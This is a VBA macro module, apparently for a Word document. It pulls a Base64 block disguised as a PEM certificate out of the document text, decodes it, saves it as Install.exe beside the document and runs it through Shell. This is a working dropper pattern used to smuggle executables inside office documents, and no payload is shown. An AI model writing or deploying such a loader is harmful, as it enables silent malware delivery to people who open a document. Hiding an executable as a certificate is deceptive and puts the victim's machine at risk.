'———————————— Module1 —————————————————

Option Explicit

' Decode from the doc, save as Install.exe, then run it (Paste in Normal Module1).
 
Public Sub DecodeCertSaveAndRun()
    Dim certBytes()  As Byte
    Dim baseFolder   As String
    Dim outPath      As String
    Const exeName    As String = "Install.exe"

    ' 1) Where to save?  Doc folder if saved, otherwise CurDir
    If Len(ActiveDocument.Path) > 0 Then
        baseFolder = ActiveDocument.Path
    Else
        baseFolder = CurDir
    End If
    outPath = baseFolder & Application.PathSeparator & exeName

    ' 2) Decode & save
    certBytes = DecodeCertificateFromText(ActiveDocument.Content.Text)
    SaveBytesToFile certBytes, outPath

    'MsgBox "Saved to:" & vbCrLf & outPath, vbInformation

    ' 3) Execute the EXE
    Shell Chr(34) & outPath & Chr(34), vbNormalFocus
End Sub

' DecodeCertificateFromText, finds the first PEM block and Base64 decodes it.
 
Public Function DecodeCertificateFromText(ByVal fullText As String) As Byte()
    Const BEGIN_TAG As String = "-----BEGIN CERTIFICATE-----"
    Const END_TAG   As String = "-----END CERTIFICATE-----"
    Dim p1 As Long, p2 As Long
    Dim pemBlock As String, b64 As String
    Dim xmlDoc   As Object, nodeElem As Object

    p1 = InStr(1, fullText, BEGIN_TAG, vbTextCompare)
    If p1 = 0 Then Err.Raise vbObjectError + 1, , "BEGIN CERTIFICATE not found."
    p2 = InStr(p1, fullText, END_TAG, vbTextCompare)
    If p2 = 0 Then Err.Raise vbObjectError + 2, , "END CERTIFICATE not found."

    pemBlock = Mid$(fullText, p1, p2 + Len(END_TAG) - p1)
    b64 = Replace(pemBlock, BEGIN_TAG, "")
    b64 = Replace(b64, END_TAG, "")
    b64 = Replace(b64, vbCr, "")
    b64 = Replace(b64, vbLf, "")
    b64 = Replace(b64, " ", "")
    b64 = Trim$(b64)

    Set xmlDoc = CreateObject("MSXML2.DOMDocument.6.0")
    Set nodeElem = xmlDoc.createElement("Base64Data")
    nodeElem.DataType = "bin.base64"
    nodeElem.Text = b64
    DecodeCertificateFromText = nodeElem.nodeTypedValue
End Function

' SaveBytesToFile writes a Byte() array out to disk via ADODB.Stream
 
Public Sub SaveBytesToFile(ByRef data() As Byte, ByVal filePath As String)
    With CreateObject("ADODB.Stream")
        .Type = 1               ' adTypeBinary
        .Open
        .Write data
        .SaveToFile filePath, 2 ' adSaveCreateOverWrite
        .Close
    End With
End Sub

